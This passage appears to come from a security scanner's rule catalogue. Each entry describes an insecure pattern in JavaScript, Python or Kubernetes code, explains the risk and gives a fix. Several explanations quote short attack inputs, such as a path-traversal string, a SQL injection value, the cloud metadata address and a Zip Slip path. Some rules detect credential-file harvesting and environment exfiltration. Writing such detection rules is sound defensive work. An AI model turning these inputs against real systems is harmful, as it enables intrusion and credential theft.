fix: Use a lookup table or a switch for dynamic dispatch, JSON.parse for data, and a purpose-built expression library if you genuinely need user expressions.

name: Body parser configured with excessively large payload limit
message: Body parser configured with excessive request payload limit (>500mb)
why: Allowing excessively large HTTP request bodies (hundreds of megabytes or gigabytes) in general body parsing middleware enables denial of service attacks by exhausting server memory and CPU during parsing.
fix: Set strict body parser limits suited to the expected API payloads (e.g. 1mb to 10mb), and use streaming upload handlers for large files rather than in-memory body parsers.

name: CSRF protection ignores state-changing HTTP methods
message: CSRF protection middleware is configured to ignore state-changing HTTP methods (POST, PUT, DELETE, PATCH)
why: Ignoring state-changing methods disables Cross-Site Request Forgery defenses, allowing malicious websites to forge actions on behalf of authenticated users.
fix: Only ignore safe idempotent methods (GET, HEAD, OPTIONS) in CSRF middleware configurations.

name: innerHTML assigned a dynamic value
message: innerHTML is assigned a value that is not a constant string
why: A value containing markup becomes markup, and an img onerror attribute is enough to run script in the user's session.
fix: Use textContent for text, or sanitize with DOMPurify when the content is genuinely HTML.

name: JWT verification accepts the none algorithm
message: JWT configuration permits the "none" algorithm
why: With "none" accepted, anyone can mint a token by base64-encoding a payload and omitting the signature. Authentication becomes a formality.
fix: Pass an explicit algorithms allowlist containing only the algorithm you issue with, such as ["RS256"].

name: JWT payload decoded without signature verification
message: JWT payload decoded with jwt.decode without cryptographic verification
why: jwt.decode() reads the token payload without verifying that the signature is valid. An attacker can tamper with claims or provide an arbitrary signed token that will be trusted if passed to application logic.
fix: Use jwt.verify(token, secretOrPublicKey, options) to cryptographically validate the signature and claims before trusting token contents.

name: JWT verified without an algorithm allowlist
message: jwt.verify is called without an algorithms allowlist
why: Without an allowlist the library trusts the token's own alg header, which enables the classic RS256-to-HS256 confusion where the public key is used as an HMAC secret.
fix: Always pass an explicit algorithms option naming exactly the algorithm you issue, for example algorithms set to RS256 only.

name: Math.random used for a security value
message: Math.random is used to build a security value
why: Math.random is a fast non-cryptographic PRNG with observable internal state. Given a few outputs an attacker can predict the rest, which makes any token built from it guessable.
fix: Use crypto.randomUUID() or crypto.randomBytes(32).toString('base64url').

name: NestJS route handler lacks ValidationPipe
message: NestJS mutating route receives body without ValidationPipe or DTO validation
why: NestJS does not validate request payloads by default. Without a ValidationPipe or class-validator decorators, untrusted client JSON properties are passed directly into the handler, enabling mass-assignment and type-confusion vulnerabilities.
fix: Apply ValidationPipe globally (app.useGlobalPipes(new ValidationPipe({ whitelist: true }))) or use @UsePipes(new ValidationPipe()) or bind @Body(new ValidationPipe()) with a validated DTO class.

name: NestJS raw database query with string concatenation
message: Raw database query executed with dynamically concatenated string
why: Executing raw SQL statements constructed via string interpolation or concatenation allows attackers to inject arbitrary SQL statements, bypassing ORM protections and leading to unauthorized data access or database compromise.
fix: Use parameterized queries by passing SQL parameters in the second argument array (e.g., dataSource.query('SELECT * FROM users WHERE id = $1', [id])).

name: Next.js dangerouslyAllowSVG enabled without CSP or attachment header
message: Next.js image optimization allows SVGs without Content-Disposition or Content-Security-Policy
why: SVGs can contain embedded JavaScript, external entity references, and scripts. Enabling dangerouslyAllowSVG without restricting the content-disposition to attachment or applying a strict CSP allows cross-site scripting (XSS) when untrusted SVGs are rendered.
fix: Set contentDispositionType to 'attachment' and configure a restrictive contentSecurityPolicy in the images configuration.

name: Next.js unvalidated redirect using searchParams
message: redirect() directly takes search parameters without relative path validation
why: Passing query parameter values directly to redirect() without verifying they are relative paths (starting with a single '/') allows attackers to redirect users to malicious third-party phishing domains.
fix: Validate that the redirect target starts with '/' and not '//', or validate against an allowlist of safe redirect paths.

name: Next.js Server Action performing mutation without session check
message: Server Action performs database mutation or file write without session verification
why: Next.js Server Actions are public HTTP POST endpoints that anyone can invoke directly with arbitrary arguments. UI-level hiding of buttons does not secure the action; the action itself must authenticate the caller and verify permissions.
fix: Call session authentication (e.g. const session = await auth()) and verify permissions before executing any database mutation or filesystem operation.

name: Arbitrary code execution via unsafe object deserialization
message: node-serialize unserialize() allows arbitrary JavaScript execution via IIFE payloads
why: Untrusted data passed to node-serialize unserialize() allows arbitrary code execution when an object contains a function wrapper with an immediately invoked function expression (_$$ND_FUNC$$_).
fix: Use JSON.parse() for data exchange or structuredClone() for deep object cloning instead of node-serialize.

name: NoSQL query injection
message: NoSQL query document or $where expression constructed with unvalidated input
why: Passing raw request objects directly into NoSQL query filters allows attackers to inject query operators like $gt, $ne, or $where, bypassing authentication or executing arbitrary JavaScript on the database.
fix: Sanitize query keys, cast input fields explicitly with String(), or validate schemas using Zod or Joi before querying.

name: Nuxt readBody payload injected into database query, command, or file write
message: readBody() payload is directly interpolated or concatenated into a database query, shell command, or filesystem path
why: Nitro server handlers parse request bodies without schema validation. Directly interpolating or concatenating readBody properties into SQL statements, exec calls, or file paths leads directly to SQL injection, remote command execution, or arbitrary file overwrite.
fix: Validate and sanitize request payloads using readValidatedBody with a schema library (e.g. Zod), use parameterized SQL queries, avoid shells for process execution (execFile), and validate file paths against an allowlist.

name: Redirect target taken from request input
message: Redirect destination comes from request input
why: An attacker-supplied destination makes your domain the credible first hop of a phishing chain, and can leak tokens held in the referrer or the URL.
fix: Accept a relative path only, or map an identifier to an allowlisted destination.

name: Filesystem path built from request input
message: A filesystem path is built from request input
why: path.join happily resolves `../`, so a parameter of `../../etc/passwd` escapes the intended directory. Encoded traversal sequences survive most naive filters.
fix: Take only path.basename of the input, resolve against a fixed root, and assert the resolved path still starts with that root before opening it.

name: Unsafe object merge vulnerable to prototype pollution
message: Object properties merged recursively without prototype key filtering
why: Modifying object prototypes via __proto__ or constructor.prototype injects properties into all objects across the JavaScript runtime, leading to denial of service, authentication bypass, or remote code execution.
fix: Validate keys against __proto__, constructor, and prototype before assignment, or use Map or Object.create(null).

name: Regular expression compiled from request input
message: A regular expression is built from request input
why: A crafted pattern with nested quantifiers makes matching take exponential time, so a single request can pin a CPU core and take the event loop with it.
fix: Do not compile user patterns. If you must, use a linear-time engine such as RE2 and impose a length limit.

name: spawn invoked with a shell
message: Child process is spawned with shell true
why: shell:true reintroduces the metacharacter problem that spawn's argument array exists to avoid, so any argument derived from input becomes a command injection candidate.
fix: Drop shell:true and pass arguments as an array. Where you need a pipeline, build it with multiple spawns.

name: SQL built by string concatenation
message: SQL statement built by concatenating a variable
why: The concatenated value becomes part of the statement's syntax. A value of `1 OR 1=1--` changes what the query means rather than what it matches.
fix: Use parameter placeholders and pass the values separately.

name: SQL built by template interpolation
message: SQL statement built by interpolating into a template literal
why: Interpolation happens before the driver sees the string, so the value becomes SQL syntax rather than data. This is the original injection and it is still the most damaging one.
fix: Use parameter placeholders and pass values as the query's second argument, or use a tagged template from a driver that parameterizes, such as postgres.js.

name: Outbound request target taken from request input
message: An outbound request uses a URL taken directly from the incoming request
why: The server can be pointed at internal addresses the caller cannot reach, including cloud instance metadata at 169.254.169.254, which commonly yields credentials.
fix: Resolve the URL and validate the resulting IP against a denylist of private ranges, or accept an identifier and map it to a URL you control.

name: Host credential file accessed by code
message: Code accesses host credential store (.ssh, .aws, .kube, or .npmrc)
why: Reading private keys or cloud credentials from standard host locations is the primary indicator of credential harvesting malware in dependencies or build scripts.
fix: Never read host credentials directly in application code. Inject credentials via approved environment variables or secret vaults.

name: SvelteKit server load returns sensitive records without tenancy or authorization check
message: Server load function returns sensitive records without checking user session or applying a tenant filter
why: SvelteKit server load functions execute on the server and serialize their return values directly to the client browser. Querying sensitive database tables without verifying event.locals session authentication or scoping records to the authenticated tenant leaks private records across user boundaries.
fix: Authenticate the caller using event.locals (or a session guard) and filter queries by the authenticated user's ID or organization ID (e.g. WHERE user_id = locals.user.id).

name: TLS certificate verification disabled
message: TLS certificate verification is turned off
why: Without verification, TLS gives you encryption to whoever answered, which is no protection at all against an active network attacker. This is usually added to silence a self-signed certificate error in development and then shipped.
fix: Add the internal CA to the trust store, or pass it as `ca` on the request. Never disable verification in code that can reach production.

name: Password hashed with a fast digest
message: A general-purpose digest is used where a password hash belongs
why: MD5, SHA-1 and the SHA-2 family are designed to be fast, which is the opposite of what password storage needs. Commodity hardware tries billions of candidates per second against them.
fix: Use argon2id, scrypt, or bcrypt with a per-password salt and a work factor tuned to about 250ms on your hardware.

name: XML parser configured to expand external entities
message: XML parser enables entity replacement via noent: true, exposing the system to XXE
why: Setting noent: true in libxmljs causes the XML parser to expand external entities. An attacker supplying crafted XML can read arbitrary local files, access internal network endpoints via SSRF, or trigger memory exhaustion.
fix: Do not set noent: true. Keep entity expansion disabled by defaulting noent to false, or omit the option when parsing untrusted XML.

name: Container allows privilege escalation
message: Container sets allowPrivilegeEscalation = true
why: The process can gain more privileges than its parent through setuid binaries or file capabilities, which turns a limited RCE into a root one inside the container.
fix: Set allowPrivilegeEscalation = false. It is the default under the restricted Pod Security Standard for a reason.

name: Binding grants access to unauthenticated users
message: Role binding includes system:unauthenticated or system:anonymous
why: Anyone who can reach the API server, authenticated or not, receives the bound permissions.
fix: Remove the subject. If public read access to something is genuinely required, expose it through an application, not the Kubernetes API.

name: Service account token mounted unnecessarily
message: Pod does not disable automountServiceAccountToken
why: The token is mounted into every container by default, so any code execution in the pod immediately has an API credential to enumerate and move laterally with.
fix: Set automountServiceAccountToken = false on the pod spec unless the workload actually calls the Kubernetes API.

name: Binding grants cluster-admin
message: Binding grants the cluster-admin role
why: Whatever holds this binding can do anything in the cluster. Bound to a service account, it means any code execution in that workload is a full cluster compromise.
fix: Create a role with the specific permissions needed and bind that instead.

name: Container adds dangerous capabilities
message: Container adds a capability that undermines the sandbox
why: SYS_ADMIN is close to privileged in practice, SYS_PTRACE allows inspecting and injecting into other processes, and SYS_MODULE loads kernel modules. Each is a documented escape route.
fix: Drop ALL capabilities and add back only the narrow ones the process needs, such as NET_BIND_SERVICE for a low port.

name: Workload deploys into the default namespace
message: Workload is pinned to the default namespace
why: The default namespace usually has no NetworkPolicy, no resource quota, and no distinct RBAC, so workloads there inherit the weakest posture in the cluster.
fix: Deploy into a dedicated namespace with its own NetworkPolicy, quota, and Pod Security Standard label.

name: Container mounts the container runtime socket
message: Pod mounts the container runtime socket from the host
why: Access to the runtime socket is equivalent to root on the node: it can start a new privileged container mounting the host filesystem. This is the single most reliable container escape there is.
fix: Use the Kubernetes API with a scoped service account instead. If a build workload needs image creation, use a rootless builder such as Kaniko or Buildah.

name: Pod shares a host namespace
message: Pod shares the host network, PID, or IPC namespace
why: Sharing a host namespace removes the isolation the pod boundary exists to provide: hostNetwork exposes every local service and the node's identity, and hostPID lets the container see and signal host processes.
fix: Remove the host namespace flag. If a service needs node-level access, use a DaemonSet with the narrowest namespace it truly requires.

name: Pod mounts a host path
message: Pod mounts a path from the host filesystem
why: A hostPath mount crosses the isolation boundary. Depending on the path it can expose node credentials, other pods' data, or a writable location the kubelet will later execute from.
fix: Use a PersistentVolumeClaim, configMap, or emptyDir. Where hostPath is unavoidable, mount it readOnly and narrow the path.

name: Ingress does not configure TLS encryption
message: Ingress defines routing rules without configuring a tls termination block
why: Serving ingress traffic over plaintext HTTP exposes cookies, session tokens, and request payloads to eavesdropping and manipulation by anyone on the network path.
fix: Add a spec.tls block referencing a TLS Secret or cert-manager ClusterIssuer to terminate HTTPS traffic on the ingress.

name: Container image uses a mutable tag
message: Container image uses the mutable :latest tag: {{image}}
why: Rollouts become non-deterministic and non-reproducible: two pods of the same Deployment can run different code, and a rollback does not roll the image back.
fix: Pin to an immutable tag or a digest, and set imagePullPolicy accordingly.

name: Pod does not configure a secure seccomp profile
message: Pod does not enforce RuntimeDefault or Localhost seccompProfile
why: Unconfined system calls expose the host kernel to container breakouts when kernel vulnerabilities exist. Pod Security Standards (Baseline and Restricted) mandate specifying RuntimeDefault or Localhost seccomp profiles.
fix: Set securityContext.seccompProfile.type = "RuntimeDefault" on the Pod spec or individual container securityContext.

name: Container declares no resource limits
message: Container sets no resources.limits
why: Without limits one compromised or looping container can exhaust node memory and CPU, evicting everything else scheduled there. It turns a single-workload bug into a node-wide outage.
fix: Set resources.limits for memory and CPU, and matching requests so the scheduler places the pod honestly.

name: Service exposed as NodePort
message: Service is of type NodePort
why: NodePort opens the port on every node, bypassing ingress controls, WAF, and whatever authentication the ingress layer applies.
fix: Use ClusterIP with an Ingress, or a LoadBalancer service with restricted source ranges.

name: Container runs privileged
message: Container sets securityContext.privileged = true
why: A privileged container has every capability and effectively full access to the host kernel and devices. Escaping to the node is a documented one-liner, and from the node the whole cluster is reachable.
fix: Remove privileged and add only the specific capabilities the workload needs. If it genuinely needs host access, isolate it on a dedicated node pool with its own RBAC.

name: Container runs as root
message: Container runs as uid 0
why: Root in the container is root on the host for anything that crosses the boundary, including hostPath mounts and any capability the runtime leaves in place.
fix: Set runAsNonRoot = true and runAsUser to a non-zero uid, and make the image's files readable by it.

name: Secret hardcoded in a container environment variable
message: Environment variable {{name}} holds a literal value in the manifest
why: Manifests are usually in version control and readable by everyone with repository access, which is a far wider group than those who should hold production credentials.
fix: Reference a Secret with valueFrom.secretKeyRef, and source the Secret from an external store rather than committing it.

name: AppArmor profile disabled or not enforced
message: Pod container missing AppArmor profile annotation or explicitly set to unconfined
why: Running containers without AppArmor enforcement, or explicitly setting AppArmor to unconfined, removes Mandatory Access Control protections and allows compromised processes unrestricted access to permitted kernel capabilities.
fix: Add container.apparmor.security.beta.kubernetes.io/<container-name> annotation set to runtime/default or a validated localhost/<profile> profile.

name: Container image has no tag
message: Container image has no tag, so it resolves to :latest: {{image}}
why: An untagged image is :latest with the problem hidden, which makes the non-determinism harder to notice in review.
fix: Pin to an explicit tag or digest.

name: Role grants every verb on every resource
message: Role rule grants verbs "*" on resources "*"
why: On a ClusterRole this is cluster-admin by another name: read every secret, create privileged pods on any node, and modify the RBAC that would constrain it.
fix: Enumerate the verbs and resources the workload uses. `kubectl auth can-i --list` against the current binding is a good starting point.

name: Container root filesystem is writable
message: Container does not set readOnlyRootFilesystem
why: A writable root filesystem lets an attacker who achieves execution persist a payload, modify application code, or drop a binary the next restart will run.
fix: Set readOnlyRootFilesystem = true and mount an emptyDir for the paths the process legitimately writes.

name: Authorization enforced with assert
message: An authorization check is written as an assert
why: Python removes assert statements entirely under -O, which production deployments and many container images enable. The check silently disappears and every request is authorized.
fix: Raise an explicit exception, such as PermissionDenied or HTTPException(403).

name: Service binds to all interfaces
message: Service binds to 0.0.0.0
why: Binding to all interfaces exposes the service on every network the host is attached to, which in a container with host networking or a VM with a public interface means the internet.
fix: Bind to 127.0.0.1 and put a reverse proxy in front, or make the bind address configurable and default it to loopback. Inside a container with its own network namespace 0.0.0.0 is often correct; confirm which case this is.

name: TLS verification mode set to CERT_NONE
message: TLS verification mode is set to CERT_NONE
why: The connection is encrypted to whoever answered, which is no defence against an active network attacker. Reported at firm rather than confirmed because a library implementing an opt-out looks identical to a caller taking it.
fix: Set cert_reqs to CERT_REQUIRED and supply the CA bundle the peer should be validated against.

name: Cookie transmitted over unencrypted HTTP
message: Cookie sets secure=False allowing plaintext transmission over HTTP
why: Cookies set without the Secure attribute are transmitted in cleartext over unencrypted HTTP connections, allowing attackers on the network path to intercept sensitive credentials or session tokens.
fix: Set secure=True to ensure transmission only occurs over HTTPS connections.

name: Session cookie readable from client-side JavaScript
message: Cookie sets httponly=False allowing client-side scripts to access sensitive session state
why: Cookies storing session or authentication tokens without the HttpOnly attribute can be read by client-side JavaScript via document.cookie, exposing them to theft via Cross-Site Scripting (XSS).
fix: Set httponly=True for authentication and session cookies to ensure they cannot be accessed by client-side scripts.

name: Wildcard CORS origin configuration
message: Cross-Origin Resource Sharing (CORS) configured with wildcard '*' origin
why: Allowing wildcard origins (*) permits any untrusted website to make cross-origin requests to the application and access sensitive API responses, undermining the same-origin policy and leading to data exfiltration.
fix: Restrict allowed origins to an explicit list of trusted domain names rather than wildcard '*'.

name: CSRF protection disabled on view
message: View disables CSRF protection
why: Disabling CSRF protection allows attacker-controlled web pages to trigger state-changing actions on behalf of authenticated users via ambient credentials like session cookies.
fix: Remove @csrf_exempt. For machine-to-machine APIs, use header-based authorization tokens (Bearer or API keys) rather than session cookies.

name: Process environment harvested to network
message: Entire environment dictionary is passed to an outbound network request
why: Serializing os.environ into an outbound HTTP request leaks all environment variables, including database passwords, cloud tokens, and API credentials.
fix: Send only explicit, validated parameters instead of dumping the entire os.environ dictionary.

name: Dynamic code execution
message: Code is compiled and executed at runtime
why: Any input reaching eval or exec is arbitrary code with the process's privileges. Python has no sandbox for this: restricted-mode escapes are well documented and short.
fix: Use ast.literal_eval for data, a dict for dispatch, or a purpose-built expression parser.

name: Debug mode enabled
message: Debug mode is enabled
why: The Werkzeug debugger exposes an interactive Python console on any traceback. Reachable from the network it is unauthenticated remote code execution, and Django's DEBUG leaks settings and query contents.
fix: Read the flag from the environment and default it to False.

name: Weak or deprecated cryptographic cipher or mode
message: Deprecated or broken cipher (DES, 3DES, RC4, Blowfish) or ECB mode used
why: Ciphers like DES, 3DES, RC4, and Blowfish have small block sizes or known cryptanalytic weaknesses allowing plaintext recovery. ECB mode lacks semantic security, leaking structural patterns because identical plaintext blocks produce identical ciphertext blocks.
fix: Use modern authenticated encryption (AEAD) such as AES-GCM (AES.MODE_GCM) or ChaCha20-Poly1305 with unique nonces.

name: Template autoescaping disabled
message: Jinja autoescaping is turned off
why: Every variable rendered into a template becomes raw HTML, so one stored value with a script tag becomes cross-site scripting on every page that renders it.
fix: Leave autoescape on and mark the specific trusted values with Markup, rather than disabling it globally.

name: JWT signature verification disabled or accepts none algorithm
message: JWT verification disabled via verify=False, verify_signature=False, or none algorithm
why: Disabling JWT signature verification or allowing the none algorithm permits attackers to forge tokens with arbitrary claims and bypass authentication.
fix: Require signature verification and specify explicit cryptographic algorithms such as HS256 or RS256 in the algorithms allowlist.

name: JWT decoded without cryptographic signature verification
message: JWT payload decoded with signature verification explicitly disabled
why: Decoding a JWT with verify=False or verify_signature: False allows attackers to forge tokens with altered claims, user IDs, or roles without knowing the secret or signing key.
fix: Always verify cryptographic signatures using jwt.decode(token, secret, algorithms=["HS256"]). If inspect claims unverified for routing, never use them for authorization.

name: MongoDB query uses $where operator
message: MongoDB query uses $where JavaScript evaluation operator
why: The $where operator executes arbitrary JavaScript on the database server, allowing code injection and data exfiltration when evaluated with untrusted input.
fix: Use standard query operators (such as $eq, $in, $gt) instead of JavaScript evaluation via $where.

name: Redirect destination taken from request input
message: Redirect destination comes directly from unvalidated request input
why: Redirecting to an unvalidated, user-controlled destination allows attackers to launch phishing campaigns using your trusted domain as the first hop, and can leak sensitive tokens via the Referer header or redirect URLs.
fix: Ensure redirect targets are relative paths, or validate the destination URL against an allowlist of trusted domains using django.utils.http.url_has_allowed_host_and_scheme or a similar validator.

name: os.system with an interpolated command
message: os.system builds its command from an interpolated value
why: os.system always goes through a shell, so an interpolated value is a command injection candidate with no escaping in the way.
fix: Use subprocess.run with an argument list and shell defaulting to False.

name: Insecure SSH AutoAddPolicy accepts untrusted host keys
message: Paramiko SSH client is configured with AutoAddPolicy which blindly trusts any server host key
why: Using AutoAddPolicy() automatically adds and trusts unknown SSH host keys without verification, leaving connections vulnerable to Man-in-the-Middle (MitM) attacks.
fix: Use RejectPolicy() or WarningPolicy() and ensure trusted host keys are verified from known_hosts.

name: Pickle deserialization
message: Data is deserialized with pickle
why: Unpickling executes the __reduce__ method of whatever the stream says the object is, so a crafted payload runs code during load. This is the intended behaviour of the format, not a bug in it.
fix: Use JSON for data interchange. If you must accept pickled data, sign it with HMAC and verify before unpickling, and treat the key as a credential.

name: Non-cryptographic randomness for a security value
message: The random module is used in a file that generates security values
why: random is a Mersenne Twister with observable state: 624 outputs are enough to reconstruct it and predict everything that follows.
fix: Use the secrets module, such as secrets.token_urlsafe(32) or secrets.randbelow.

name: Regular expression compiled from untrusted request input
message: Regular expression pattern compiled directly from incoming request input (ReDoS risk)
why: Compiling or evaluating regular expressions directly from user-supplied input allows attackers to inject catastrophic backtracking patterns (ReDoS), causing prolonged high CPU consumption and service denial.
fix: Use re.escape() to sanitize user input before including it in regular expressions, or restrict matching to static, pre-compiled patterns.

name: TLS certificate verification disabled
message: TLS certificate verification is turned off
why: The connection is encrypted to whoever answered, which is no defence against an active network attacker. This is usually added to silence a certificate error and then never removed.
fix: Pass verify with the path to your internal CA bundle, or install the CA into the system trust store.

name: SQL built with an f-string
message: SQL statement built with an f-string
why: The value is substituted before the driver sees the statement, so it becomes SQL syntax rather than a parameter. DB-API placeholders exist precisely to avoid this and are no harder to write.
fix: Use %s or :name placeholders and pass the values as the execute call's second argument.

name: SQL built with percent formatting
message: SQL statement built with percent formatting before execute
why: Formatting with `%` happens in Python, so the driver receives an already assembled string. Passing the values as execute's second argument looks almost identical and is parameterized.
fix: Change `cur.execute(q % vals)` to `cur.execute(q, vals)`.

name: Insecure or deprecated ssl.wrap_socket without context
message: Deprecated ssl.wrap_socket or PROTOCOL_SSLv23 used without secure defaults
why: ssl.wrap_socket() was deprecated in Python 3.7 and removed in 3.12 because it defaults to insecure legacy protocol versions and does not validate certificates by default. PROTOCOL_SSLv23 also permits obsolete TLS 1.0 and 1.1 versions.
fix: Use ssl.create_default_context() and call context.wrap_socket(sock, server_hostname=...) to ensure certificate validation and modern TLS protocols.

name: Outbound request target taken from request input
message: An outbound request uses a URL taken directly from incoming request parameters
why: The server can be pointed at internal addresses or cloud metadata (such as 169.254.169.254) to leak credentials and access internal services.
fix: Validate the destination URL against an allowlist of permitted hosts and IP ranges, or map indirect keys to internal URLs.

name: Host credential file accessed by code
message: Python code accesses host credential store (.ssh, .aws, .kube, or .npmrc)
why: Reading private keys or cloud credentials from user home directories is the primary sign of credential harvesting malware in dependencies or setup scripts.
fix: Never read host credentials directly in application code. Pass needed values via environment variables or a secret manager.

name: Subprocess invoked with a shell
message: Subprocess is invoked with shell=True
why: The command string is interpreted by a shell, so any interpolated value can introduce `;`, `|`, or `$()`. With a list argument and no shell there is nothing to escape in the first place.
fix: Pass the command as a list and drop shell=True. Use shlex.quote only if a shell is genuinely unavoidable.

name: Archive extracted without path validation
message: Archive is extracted without validating member paths
why: A member named ../../etc/cron.d/x writes outside the destination directory. This is Zip Slip, and it is a write primitive that frequently becomes code execution.
fix: Pass filter="data" on Python 3.12 or later, or validate each member's resolved path stays under the destination.

name: Insecure temporary file creation
message: tempfile.mktemp is used to choose a path
why: mktemp returns a name without creating the file, so anything can create a symlink at that path before you open it and redirect your write.
fix: Use tempfile.NamedTemporaryFile or mkstemp, which create the file atomically.

name: Password hashed with a fast digest
message: A general-purpose digest is used where a password hash belongs
why: These digests are built to be fast, which is exactly wrong for password storage. A commodity GPU tries billions of candidates per second.
fix: Use argon2-cffi, or hashlib.scrypt with a per-password salt and a tuned work factor.

name: XML parsed with an entity-expanding parser
message: XML is parsed with a parser that may expand external entities
why: A document declaring an external entity can read local files or make the server issue requests on the attacker's behalf, and billion-laughs expansion can exhaust memory.
